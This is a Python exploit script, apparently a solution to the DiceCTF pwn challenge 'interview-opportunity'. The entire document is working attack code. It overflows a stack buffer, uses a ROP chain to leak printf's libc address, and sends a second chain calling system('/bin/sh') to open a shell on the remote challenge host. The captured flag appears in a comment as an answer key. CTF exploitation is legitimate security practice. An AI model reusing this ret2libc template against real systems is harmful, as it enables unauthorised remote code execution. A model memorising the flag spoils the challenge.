#!/usr/bin/env python3
from sc_expwn import *  # https://raw.githubusercontent.com/shift-crops/sc_expwn/master/sc_expwn.py

bin_file = './interview-opportunity'
context(os = 'linux', arch = 'amd64')
# context.log_level = 'debug'

#==========

env = Environment('debug', 'local', 'remote')
env.set_item('mode',    debug = 'DEBUG', local = 'PROC', remote = 'SOCKET')
env.set_item('target',  debug   = {'argv':[bin_file], 'aslr':False, 'gdbscript':''}, \
                        local   = {'argv':[bin_file]}, \
                        remote  = {'host':'mc.ax', 'port':31081})
env.set_item('libc',    debug   = None, \
                        local   = None, \
                        remote  = 'libc.so.6')
env.select()

#==========

binf = ELF(bin_file)
addr_got_printf     = binf.got['printf']
addr_main           = binf.sep_function['main']

libc = ELF(env.libc) if env.libc else binf.libc
offset_libc_printf  = libc.sep_function['printf']

#==========

def attack(conn, **kwargs):
    rop = ROP(binf)
    rop.puts(addr_got_printf)
    rop.call(addr_main)

    exploit  = b'\x00'*0x1a
    exploit += p64(0xdeadbeef)
    exploit += bytes(rop)
    conn.sendafter('DiceGang?\n', exploit)

    conn.recvuntil('Hello: \n\n')
    addr_libc_printf = u(conn.recv(6))
    libc.address = addr_libc_printf - offset_libc_printf
    info('addr_libc_base    = 0x{:08x}'.format(libc.address))
    addr_libc_str_sh    = next(libc.search(b'/bin/sh'))
 
    rop = ROP(libc)
    rop.raw(rop.ret)
    rop.system(addr_libc_str_sh)

    exploit  = b'\x00'*0x1a
    exploit += p64(0xdeadbeef)
    exploit += bytes(rop)
    conn.sendafter('DiceGang?\n', exploit)

#==========

def main():
    comn = Communicate(env.mode, **env.target)
    comn.connect()
    comn.run(attack)
    comn.interactive()
    # dice{0ur_f16h7_70_b347_p3rf3c7_blu3_5h4ll_c0n71nu3}

if __name__=='__main__':
    main()

#==========
